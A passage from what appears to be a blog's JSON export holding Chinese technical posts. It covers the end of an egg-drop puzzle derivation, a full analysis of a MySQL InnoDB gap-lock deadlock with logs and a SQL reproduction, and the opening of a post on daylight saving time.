1+(m-2) + 1+(m-3) ...\n= m + m(m-1)/2\n\n\n3  个鸡蛋 m  次机会 --> h 可以表示为\n\n1+(m-1)+(m-1)(m-2)/2 + 1+(m-2)+(m-2)(m-3)/2 + 1+(m-3)+(m-3)(m-4)/2 ...\n\n\n重点来了! f(m) = m(m-1)/2 + (m-1)(m-2)/2 + (m-2)(m-3)/2 ...  可表示为 (m+2)(m+1)m/(3*2),\n具体证明如下:\n\n当有3个蛋时, 假设推论成立, 那么\n\nf(m) - f(m-1) \n= (m+2)(m+1)m/(3*2) - (m+1)m(m-1)/(3*2)\n= 3(m+1)m/6\n= (m+1)m/2\n\n可知, 推论成立.\n\n\n证明的过程是不是感觉很亲切? 对! 数学归纳法! (中学数学都白学了)\n\n所以, 3  个鸡蛋 m  次机会 --> h 可以表示为\n\n1+(m-1)+(m-1)(m-2)/2 + 1+(m-2)+(m-2)(m-3)/2 + 1+(m-3)+(m-3)(m-4)/2 ...\n= m + m(m-1)/2 + m(m-1)(m-2)/(3*2)\n\n\n所以, 4  个鸡蛋 m  次机会 --> h 可以表示为 m + m(m-1)/2 + m(m-1)(m-2)/(3*2) +\nm(m-1)(m-2)(m-3)/(4*3*2)  (不再证明)\n\n当有n个鸡蛋时, h 可表示为 m + m(m-1)/2 + ... + m!/((m-n)!n!)\n\n也就是答案中的代码了.\n\n甚至还有大神发现(或者他们知道什么更高级的定理), 问题的解可以理解为对 (1+1)^m-1  做泰勒展开的前 n  项:\n\n\n\n * 二项式的泰勒展开公式 : (1+x)^k = 1 + kx + k(k-1)/2!*x^2 + ... + k(k-1)...(k-n+1)/n!x^k\n   + ...\n\n后记\n在尝试解这道题的过程中, 还尝试过一些其他的思路, 最后都以失败告终, 例如用矩阵快速幂优化动态规划的思路, 最后也以失败告终.\n\n可得仅包含 m  的递推公式:\n\n\n\n具体可有如下代码. 不过最后也仅能通过 advanced, 而且并不快.\n\nimport numpy as np\n\ndef height(n, m):\n    if n ==0 or m ==0:\n        return 0\n    matrix = np.zeros((n, n), dtype=object)\n    for i in range(n):\n        matrix[i][i] = 1\n        if i < n-1:\n            matrix[i][i+1] = 1\n    res = np.ones((n, 1), dtype=object)\n    for i in range(m-1):\n        res = matrix.dot(res) + np.ones((n, 1), dtype=object)\n    return res[0]\n\n\n关于用矩阵快速幂优化动态规划的细节, 可参看这篇博客\n[http://blog.csdn.net/CSDNjiangshan/article/details/75136730].\n\n虽然最后并没有靠自己的独立思考找到问题的答案, 但在解题的过程中也有不小的收获, 看来在学习算法的路上还有很长的路要走啊! 共勉!","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-09-24 08:25:59","updated_at":"2017-09-26 08:01:20","published_at":"2017-09-25 10:03:13","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e82","uuid":"a6841a3c-31e9-461b-8e11-c54dcee40abf","title":"小心区间锁","slug":"be-careful-about-gap-locks","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"某日收到项目监控系统报警, 经查询业务日志后发现, 是数据库中发生一处死锁触发业务异常回滚导致的.\\n\\n执行 `show engine innodb status;` 得到如下死锁日志(相关数据已做脱敏处理):\\n\\n```\\n------------------------\\nLATEST DETECTED DEADLOCK\\n------------------------\\n2018-01-01 20:09:11 7fa66d7be700\\n*** (1) TRANSACTION:\\nTRANSACTION 138251491, ACTIVE 0.152 sec inserting\\nmysql tables in use 1, locked 1\\nLOCK WAIT 12 lock struct(s), heap size 2936, 7 row lock(s), undo log entries 6\\nLOCK BLOCKING MySQL thread id: 84192442 block 17087795\\nMySQL thread id 17087795, OS thread handle 0x7fa6897a0700, query id 2011577417 172.1.1.1 exchange update\\ninsert into orders (id, order_no, account_no,\\n      account_type, level, symbol,\\n      action, order_type, price_limit,\\n      price_average, quantity, quantity_remaining,\\n      amount, amount_remaining, fee,\\n      fee_rate, status, state,\\n      from_client_type, utc_create, utc_update\\n      )\\n    values (null, 2222222, 3333333,\\n      1, 1, 'XXX',\\n      2, 1, 2000.00,\\n      0, 1.5000, 1.5000,\\n      0, 0, 0,\\n      0.00000000000, 0, 0,\\n      null, '2018-01-01 12:09:11.532', '2018-01-01 12:09:11.532'\\n      )\\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\\nRECORD LOCKS space id 313 page no 182549 n bits 1000 index `uniq_order_no` of table `xxx`.`orders` trx id 138251491 lock_mode X insert intention waiting\\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\\n 0: len 8; hex 73757072656d756d; asc supremum;;\\n \\n*** (2) TRANSACTION:\\nTRANSACTION 138251502, ACTIVE 0.026 sec starting index read\\nmysql tables in use 1, locked 1\\n10 lock struct(s), heap size 2936, 10 row lock(s), undo log entries 3\\nMySQL thread id 84192442, OS thread handle 0x7fa66d7be700, query id 2011577436 172.1.1.1 exchange statistics\\n \\n \\nSELECT id,account_no ,user_no , account_type ,currency ,amount ,freeze_amount ,status ,\\n                        create_at ,update_at\\n                        FROM account_info\\n          WHERE ACCOUNT_TYPE = 'GENERAL_ACCOUNT' AND USER_NO = 1111111 AND CURRENCY = 'USD'  for update\\n \\n*** (2) HOLDS THE LOCK(S):\\nRECORD LOCKS space id 313 page no 182549 n bits 1000 index `uniq_order_no` of table `xxx`.`orders` trx id 138251502 lock_mode X\\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\\n 0: len 8; hex 73757072656d756d; asc supremum;;\\n \\n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\\nRECORD LOCKS space id 110 page no 11 n bits 448 index `uniq_user_no_account_type_currency` of table `xxx`.`accounts` trx id 138251502 lock_mode X locks rec but not gap waiting\\nRecord lock, heap no 105 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\\n 0: len 8; hex 9602ffaf05a03001; asc       0 ;;\\n 1: len 15; hex 47454e4552414c5f4143434f554e54; asc GENERAL_ACCOUNT;;\\n 2: len 3; hex 555344; asc USD;;\\n 3: len 8; hex 8000000000000086; asc         ;;\\n \\n*** WE ROLL BACK TRANSACTION (2)\\n```\\n\\n结合该日志可以看出, 发生死锁的语句发生在 `orders` 表和 `accounts` 表中, 根据日志内容可有如下分析结果:\\n\\n[事务1] 在向 `orders` 表中插入数据时, 无法获得在 `uniq_order_no` 索引上该位置的排它锁, 说明该位置所在的区间已被其他事务持有\\n\\n[事务2] 在获取 `accounts` 表上某行的排他锁时被阻塞, 但 [事务2] 持有了 [事务1] 所需要申请的在 `orders` 表中某位置的锁\\n\\n可以推测出 [事务1] 在向 `orders` 表插入数据前, 也正好持有了 [事务2] 在 `accounts` 所需要的锁, 死锁因此发生\\n\\n因为是在数据插入 `orders` 表之前发生了唯一键 `order_no` 上的锁被占用情况, 所以可以推测出, 该问题是由于 `order_no`=2222222 所处的区间(GAP)被锁导致的! 也就是说, 在 [事务2] 所涉及的业务里, 在锁账务之前的业务流程中, 发生了可能会锁住 `orders` 表中一段区间的SQL语句.\\n\\n\\n结合具体业务场景, 我们可作出如下推测:\\n\\n事务1: 挂单业务. 具体流程如下: 冻结A用户账户 → 向 `orders` 表中插入一条记录.\\n\\n事务2: 撮合业务. 具体流程如下: 查询某委托单A的对手单(B,C,D) → 为(A,B,C,D)加锁, 当A未被锁上时业务回滚, 当BCD未完全被锁上时, 业务可继续 → 冻结相关账户等\\n\\n死锁点: 在事务2中, 当在锁BCD前其中有撤单,且撤掉的单是 `orders` 中的最后一条数据时,该位置到正无穷的区间会被锁住. 这样事务1在向 `orders` 被锁住的区间插入新数据时会被阻塞, 而事务1又可能刚好持有了事务2中相关账户的排它锁. 死锁因此形成.\\n\\n具体死锁过程, 可通过以下例子来模拟:\\n\\n建表:\\n\\n```sql\\nCREATE TABLE `accounts` (\\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键',\\n  `number` int(10) NOT NULL COMMENT '编号',\\n  PRIMARY KEY (`id`),\\n  UNIQUE KEY `uniq_number` (`number`)\\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\\n \\nINSERT INTO `accounts` (`id`, `number`)\\nVALUES\\n    (1,1),\\n    (2,2),\\n    (3,5);\\n \\nCREATE TABLE `orders` (\\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键',\\n  `number` int(10) NOT NULL COMMENT '编号',\\n  PRIMARY KEY (`id`),\\n  UNIQUE KEY `uniq_number` (`number`)\\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\\n \\nINSERT INTO `orders` (`id`, `number`)\\nVALUES\\n    (1,1),\\n    (2,7);\\n```\\n\\n\\n事务过程:\\n\\n![](/content/images/2018/02/Screen-Shot-2018-02-10-at-10.23.53-PM.png)\\n\\n\\n死锁日志如下:\\n\\n```\\n------------------------\\nLATEST DETECTED DEADLOCK\\n------------------------\\n2018-02-10 07:54:33 0x7f61545c6700\\n*** (1) TRANSACTION:\\nTRANSACTION 10253692, ACTIVE 25 sec inserting\\nmysql tables in use 1, locked 1\\nLOCK WAIT 4 lock struct(s), heap size 1136, 5 row lock(s)\\nMySQL thread id 21, OS thread handle 140056004962048, query id 21576 172.19.0.1 root update\\ninsert into orders values(null, 10)\\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\\nRECORD LOCKS space id 6104 page no 3 n bits 72 index PRIMARY of table `test`.`orders` trx id 10253692 lock_mode X insert intention waiting\\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\\n 0: len 8; hex 73757072656d756d; asc supremum;;\\n\\n*** (2) TRANSACTION:\\nTRANSACTION 10253693, ACTIVE 21 sec starting index read\\nmysql tables in use 1, locked 1\\n4 lock struct(s), heap size 1136, 4 row lock(s)\\nMySQL thread id 26, OS thread handle 140056003897088, query id 21577 172.19.0.1 root Sending data\\nselect * from accounts where number=1 for update\\n*** (2) HOLDS THE LOCK(S):\\nRECORD LOCKS space id 6104 page no 3 n bits 72 index PRIMARY of table `test`.`orders` trx id 10253693 lock_mode X\\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\\n 0: len 8; hex 73757072656d756d; asc supremum;;\\n\\nRecord lock, heap no 2 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\\n 0: len 4; hex 00000001; asc     ;;\\n 1: len 6; hex 0000009c7575; asc     uu;;\\n 2: len 7; hex ae000001e90110; asc        ;;\\n 3: len 4; hex 80000001; asc     ;;\\n\\nRecord lock, heap no 3 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\\n 0: len 4; hex 00000002; asc     ;;\\n 1: len 6; hex 0000009c7575; asc     uu;;\\n 2: len 7; hex ae000001e9011d; asc        ;;\\n 3: len 4; hex 80000007; asc     ;;\\n\\n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\\nRECORD LOCKS space id 6103 page no 3 n bits 72 index PRIMARY of table `test`.`accounts` trx id 10253693 lock_mode X waiting\\nRecord lock, heap no 2 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\\n 0: len 4; hex 00000001; asc     ;;\\n 1: len 6; hex 0000009c756c; asc     ul;;\\n 2: len 7; hex a7000004a10110; asc        ;;\\n 3: len 4; hex 80000001; asc     ;;\\n\\n*** WE ROLL BACK TRANSACTION (2)\\n```\\n\\n在交易所的具体业务中, 出现该死锁需要满足以下几个条件:\\n\\n1. 账户A撤回了刚刚挂上的委托单, 且该单是 `orders` 表中最新的一个\\n2. 撤单的前一个瞬间该委托单作为被动方被稍早时间插入的对手单匹配\\n3. 在这笔撮合没有完成的极短时间范围内, 账户A又向 `orders` 表中挂入一个新单(出现概率低,且普通用户操作很难实现)\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>某日收到项目监控系统报警, 经查询业务日志后发现, 是数据库中发生一处死锁触发业务异常回滚导致的.</p>\n<p>执行 <code>show engine innodb status;</code> 得到如下死锁日志(相关数据已做脱敏处理):</p>\n<pre><code>------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n2018-01-01 20:09:11 7fa66d7be700\n*** (1) TRANSACTION:\nTRANSACTION 138251491, ACTIVE 0.152 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 12 lock struct(s), heap size 2936, 7 row lock(s), undo log entries 6\nLOCK BLOCKING MySQL thread id: 84192442 block 17087795\nMySQL thread id 17087795, OS thread handle 0x7fa6897a0700, query id 2011577417 172.1.1.1 exchange update\ninsert into orders (id, order_no, account_no,\n      account_type, level, symbol,\n      action, order_type, price_limit,\n      price_average, quantity, quantity_remaining,\n      amount, amount_remaining, fee,\n      fee_rate, status, state,\n      from_client_type, utc_create, utc_update\n      )\n    values (null, 2222222, 3333333,\n      1, 1, 'XXX',\n      2, 1, 2000.00,\n      0, 1.5000, 1.5000,\n      0, 0, 0,\n      0.00000000000, 0, 0,\n      null, '2018-01-01 12:09:11.532', '2018-01-01 12:09:11.532'\n      )\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 313 page no 182549 n bits 1000 index `uniq_order_no` of table `xxx`.`orders` trx id 138251491 lock_mode X insert intention waiting\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n \n*** (2) TRANSACTION:\nTRANSACTION 138251502, ACTIVE 0.026 sec starting index read\nmysql tables in use 1, locked 1\n10 lock struct(s), heap size 2936, 10 row lock(s), undo log entries 3\nMySQL thread id 84192442, OS thread handle 0x7fa66d7be700, query id 2011577436 172.1.1.1 exchange statistics\n \n \nSELECT id,account_no ,user_no , account_type ,currency ,amount ,freeze_amount ,status ,\n                        create_at ,update_at\n                        FROM account_info\n          WHERE ACCOUNT_TYPE = 'GENERAL_ACCOUNT' AND USER_NO = 1111111 AND CURRENCY = 'USD'  for update\n \n*** (2) HOLDS THE LOCK(S):\nRECORD LOCKS space id 313 page no 182549 n bits 1000 index `uniq_order_no` of table `xxx`.`orders` trx id 138251502 lock_mode X\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n \n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 110 page no 11 n bits 448 index `uniq_user_no_account_type_currency` of table `xxx`.`accounts` trx id 138251502 lock_mode X locks rec but not gap waiting\nRecord lock, heap no 105 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 8; hex 9602ffaf05a03001; asc       0 ;;\n 1: len 15; hex 47454e4552414c5f4143434f554e54; asc GENERAL_ACCOUNT;;\n 2: len 3; hex 555344; asc USD;;\n 3: len 8; hex 8000000000000086; asc         ;;\n \n*** WE ROLL BACK TRANSACTION (2)\n</code></pre>\n<p>结合该日志可以看出, 发生死锁的语句发生在 <code>orders</code> 表和 <code>accounts</code> 表中, 根据日志内容可有如下分析结果:</p>\n<p>[事务1] 在向 <code>orders</code> 表中插入数据时, 无法获得在 <code>uniq_order_no</code> 索引上该位置的排它锁, 说明该位置所在的区间已被其他事务持有</p>\n<p>[事务2] 在获取 <code>accounts</code> 表上某行的排他锁时被阻塞, 但 [事务2] 持有了 [事务1] 所需要申请的在 <code>orders</code> 表中某位置的锁</p>\n<p>可以推测出 [事务1] 在向 <code>orders</code> 表插入数据前, 也正好持有了 [事务2] 在 <code>accounts</code> 所需要的锁, 死锁因此发生</p>\n<p>因为是在数据插入 <code>orders</code> 表之前发生了唯一键 <code>order_no</code> 上的锁被占用情况, 所以可以推测出, 该问题是由于 <code>order_no</code>=2222222 所处的区间(GAP)被锁导致的! 也就是说, 在 [事务2] 所涉及的业务里, 在锁账务之前的业务流程中, 发生了可能会锁住 <code>orders</code> 表中一段区间的SQL语句.</p>\n<p>结合具体业务场景, 我们可作出如下推测:</p>\n<p>事务1: 挂单业务. 具体流程如下: 冻结A用户账户 → 向 <code>orders</code> 表中插入一条记录.</p>\n<p>事务2: 撮合业务. 具体流程如下: 查询某委托单A的对手单(B,C,D) → 为(A,B,C,D)加锁, 当A未被锁上时业务回滚, 当BCD未完全被锁上时, 业务可继续 → 冻结相关账户等</p>\n<p>死锁点: 在事务2中, 当在锁BCD前其中有撤单,且撤掉的单是 <code>orders</code> 中的最后一条数据时,该位置到正无穷的区间会被锁住. 这样事务1在向 <code>orders</code> 被锁住的区间插入新数据时会被阻塞, 而事务1又可能刚好持有了事务2中相关账户的排它锁. 死锁因此形成.</p>\n<p>具体死锁过程, 可通过以下例子来模拟:</p>\n<p>建表:</p>\n<pre><code class=\"language-sql\">CREATE TABLE `accounts` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键',\n  `number` int(10) NOT NULL COMMENT '编号',\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `uniq_number` (`number`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n \nINSERT INTO `accounts` (`id`, `number`)\nVALUES\n    (1,1),\n    (2,2),\n    (3,5);\n \nCREATE TABLE `orders` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键',\n  `number` int(10) NOT NULL COMMENT '编号',\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `uniq_number` (`number`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n \nINSERT INTO `orders` (`id`, `number`)\nVALUES\n    (1,1),\n    (2,7);\n</code></pre>\n<p>事务过程:</p>\n<p><img src=\"/content/images/2018/02/Screen-Shot-2018-02-10-at-10.23.53-PM.png\" alt=\"\"></p>\n<p>死锁日志如下:</p>\n<pre><code>------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n2018-02-10 07:54:33 0x7f61545c6700\n*** (1) TRANSACTION:\nTRANSACTION 10253692, ACTIVE 25 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 4 lock struct(s), heap size 1136, 5 row lock(s)\nMySQL thread id 21, OS thread handle 140056004962048, query id 21576 172.19.0.1 root update\ninsert into orders values(null, 10)\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 6104 page no 3 n bits 72 index PRIMARY of table `test`.`orders` trx id 10253692 lock_mode X insert intention waiting\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n\n*** (2) TRANSACTION:\nTRANSACTION 10253693, ACTIVE 21 sec starting index read\nmysql tables in use 1, locked 1\n4 lock struct(s), heap size 1136, 4 row lock(s)\nMySQL thread id 26, OS thread handle 140056003897088, query id 21577 172.19.0.1 root Sending data\nselect * from accounts where number=1 for update\n*** (2) HOLDS THE LOCK(S):\nRECORD LOCKS space id 6104 page no 3 n bits 72 index PRIMARY of table `test`.`orders` trx id 10253693 lock_mode X\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n\nRecord lock, heap no 2 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 00000001; asc     ;;\n 1: len 6; hex 0000009c7575; asc     uu;;\n 2: len 7; hex ae000001e90110; asc        ;;\n 3: len 4; hex 80000001; asc     ;;\n\nRecord lock, heap no 3 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 00000002; asc     ;;\n 1: len 6; hex 0000009c7575; asc     uu;;\n 2: len 7; hex ae000001e9011d; asc        ;;\n 3: len 4; hex 80000007; asc     ;;\n\n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 6103 page no 3 n bits 72 index PRIMARY of table `test`.`accounts` trx id 10253693 lock_mode X waiting\nRecord lock, heap no 2 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 00000001; asc     ;;\n 1: len 6; hex 0000009c756c; asc     ul;;\n 2: len 7; hex a7000004a10110; asc        ;;\n 3: len 4; hex 80000001; asc     ;;\n\n*** WE ROLL BACK TRANSACTION (2)\n</code></pre>\n<p>在交易所的具体业务中, 出现该死锁需要满足以下几个条件:</p>\n<ol>\n<li>账户A撤回了刚刚挂上的委托单, 且该单是 <code>orders</code> 表中最新的一个</li>\n<li>撤单的前一个瞬间该委托单作为被动方被稍早时间插入的对手单匹配</li>\n<li>在这笔撮合没有完成的极短时间范围内, 账户A又向 <code>orders</code> 表中挂入一个新单(出现概率低,且普通用户操作很难实现)</li>\n</ol>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"68","plaintext":"某日收到项目监控系统报警, 经查询业务日志后发现, 是数据库中发生一处死锁触发业务异常回滚导致的.\n\n执行 show engine innodb status;  得到如下死锁日志(相关数据已做脱敏处理):\n\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n2018-01-01 20:09:11 7fa66d7be700\n*** (1) TRANSACTION:\nTRANSACTION 138251491, ACTIVE 0.152 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 12 lock struct(s), heap size 2936, 7 row lock(s), undo log entries 6\nLOCK BLOCKING MySQL thread id: 84192442 block 17087795\nMySQL thread id 17087795, OS thread handle 0x7fa6897a0700, query id 2011577417 172.1.1.1 exchange update\ninsert into orders (id, order_no, account_no,\n      account_type, level, symbol,\n      action, order_type, price_limit,\n      price_average, quantity, quantity_remaining,\n      amount, amount_remaining, fee,\n      fee_rate, status, state,\n      from_client_type, utc_create, utc_update\n      )\n    values (null, 2222222, 3333333,\n      1, 1, 'XXX',\n      2, 1, 2000.00,\n      0, 1.5000, 1.5000,\n      0, 0, 0,\n      0.00000000000, 0, 0,\n      null, '2018-01-01 12:09:11.532', '2018-01-01 12:09:11.532'\n      )\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 313 page no 182549 n bits 1000 index `uniq_order_no` of table `xxx`.`orders` trx id 138251491 lock_mode X insert intention waiting\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n \n*** (2) TRANSACTION:\nTRANSACTION 138251502, ACTIVE 0.026 sec starting index read\nmysql tables in use 1, locked 1\n10 lock struct(s), heap size 2936, 10 row lock(s), undo log entries 3\nMySQL thread id 84192442, OS thread handle 0x7fa66d7be700, query id 2011577436 172.1.1.1 exchange statistics\n \n \nSELECT id,account_no ,user_no , account_type ,currency ,amount ,freeze_amount ,status ,\n                        create_at ,update_at\n                        FROM account_info\n          WHERE ACCOUNT_TYPE = 'GENERAL_ACCOUNT' AND USER_NO = 1111111 AND CURRENCY = 'USD'  for update\n \n*** (2) HOLDS THE LOCK(S):\nRECORD LOCKS space id 313 page no 182549 n bits 1000 index `uniq_order_no` of table `xxx`.`orders` trx id 138251502 lock_mode X\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n \n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 110 page no 11 n bits 448 index `uniq_user_no_account_type_currency` of table `xxx`.`accounts` trx id 138251502 lock_mode X locks rec but not gap waiting\nRecord lock, heap no 105 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 8; hex 9602ffaf05a03001; asc       0 ;;\n 1: len 15; hex 47454e4552414c5f4143434f554e54; asc GENERAL_ACCOUNT;;\n 2: len 3; hex 555344; asc USD;;\n 3: len 8; hex 8000000000000086; asc         ;;\n \n*** WE ROLL BACK TRANSACTION (2)\n\n\n结合该日志可以看出, 发生死锁的语句发生在 orders  表和 accounts  表中, 根据日志内容可有如下分析结果:\n\n[事务1] 在向 orders  表中插入数据时, 无法获得在 uniq_order_no  索引上该位置的排它锁, 说明该位置所在的区间已被其他事务持有\n\n[事务2] 在获取 accounts  表上某行的排他锁时被阻塞, 但 [事务2] 持有了 [事务1] 所需要申请的在 orders  表中某位置的锁\n\n可以推测出 [事务1] 在向 orders  表插入数据前, 也正好持有了 [事务2] 在 accounts  所需要的锁, 死锁因此发生\n\n因为是在数据插入 orders  表之前发生了唯一键 order_no  上的锁被占用情况, 所以可以推测出, 该问题是由于 order_no=2222222\n所处的区间(GAP)被锁导致的! 也就是说, 在 [事务2] 所涉及的业务里, 在锁账务之前的业务流程中, 发生了可能会锁住 orders \n表中一段区间的SQL语句.\n\n结合具体业务场景, 我们可作出如下推测:\n\n事务1: 挂单业务. 具体流程如下: 冻结A用户账户 → 向 orders  表中插入一条记录.\n\n事务2: 撮合业务. 具体流程如下: 查询某委托单A的对手单(B,C,D) → 为(A,B,C,D)加锁, 当A未被锁上时业务回滚, 当BCD未完全被锁上时,\n业务可继续 → 冻结相关账户等\n\n死锁点: 在事务2中, 当在锁BCD前其中有撤单,且撤掉的单是 orders  中的最后一条数据时,该位置到正无穷的区间会被锁住. 这样事务1在向 orders \n 被锁住的区间插入新数据时会被阻塞, 而事务1又可能刚好持有了事务2中相关账户的排它锁. 死锁因此形成.\n\n具体死锁过程, 可通过以下例子来模拟:\n\n建表:\n\nCREATE TABLE `accounts` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键',\n  `number` int(10) NOT NULL COMMENT '编号',\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `uniq_number` (`number`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n \nINSERT INTO `accounts` (`id`, `number`)\nVALUES\n    (1,1),\n    (2,2),\n    (3,5);\n \nCREATE TABLE `orders` (\n  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键',\n  `number` int(10) NOT NULL COMMENT '编号',\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `uniq_number` (`number`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n \nINSERT INTO `orders` (`id`, `number`)\nVALUES\n    (1,1),\n    (2,7);\n\n\n事务过程:\n\n\n\n死锁日志如下:\n\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n2018-02-10 07:54:33 0x7f61545c6700\n*** (1) TRANSACTION:\nTRANSACTION 10253692, ACTIVE 25 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 4 lock struct(s), heap size 1136, 5 row lock(s)\nMySQL thread id 21, OS thread handle 140056004962048, query id 21576 172.19.0.1 root update\ninsert into orders values(null, 10)\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 6104 page no 3 n bits 72 index PRIMARY of table `test`.`orders` trx id 10253692 lock_mode X insert intention waiting\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n\n*** (2) TRANSACTION:\nTRANSACTION 10253693, ACTIVE 21 sec starting index read\nmysql tables in use 1, locked 1\n4 lock struct(s), heap size 1136, 4 row lock(s)\nMySQL thread id 26, OS thread handle 140056003897088, query id 21577 172.19.0.1 root Sending data\nselect * from accounts where number=1 for update\n*** (2) HOLDS THE LOCK(S):\nRECORD LOCKS space id 6104 page no 3 n bits 72 index PRIMARY of table `test`.`orders` trx id 10253693 lock_mode X\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n\nRecord lock, heap no 2 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 00000001; asc     ;;\n 1: len 6; hex 0000009c7575; asc     uu;;\n 2: len 7; hex ae000001e90110; asc        ;;\n 3: len 4; hex 80000001; asc     ;;\n\nRecord lock, heap no 3 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 00000002; asc     ;;\n 1: len 6; hex 0000009c7575; asc     uu;;\n 2: len 7; hex ae000001e9011d; asc        ;;\n 3: len 4; hex 80000007; asc     ;;\n\n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 6103 page no 3 n bits 72 index PRIMARY of table `test`.`accounts` trx id 10253693 lock_mode X waiting\nRecord lock, heap no 2 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 00000001; asc     ;;\n 1: len 6; hex 0000009c756c; asc     ul;;\n 2: len 7; hex a7000004a10110; asc        ;;\n 3: len 4; hex 80000001; asc     ;;\n\n*** WE ROLL BACK TRANSACTION (2)\n\n\n在交易所的具体业务中, 出现该死锁需要满足以下几个条件:\n\n 1. 账户A撤回了刚刚挂上的委托单, 且该单是 orders  表中最新的一个\n 2. 撤单的前一个瞬间该委托单作为被动方被稍早时间插入的对手单匹配\n 3. 在这笔撮合没有完成的极短时间范围内, 账户A又向 orders  表中挂入一个新单(出现概率低,且普通用户操作很难实现)","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-01-26 23:40:08","updated_at":"2018-02-12 08:42:04","published_at":"2018-02-10 15:01:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e83","uuid":"0300d706-ddc5-4c0e-b197-e93496145004","title":"夏令时的困惑","slug":"summer-time-confusion","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 对于像我一样一直生活在中国的年轻人来说, 夏令时也许是比较一个陌生的概念. 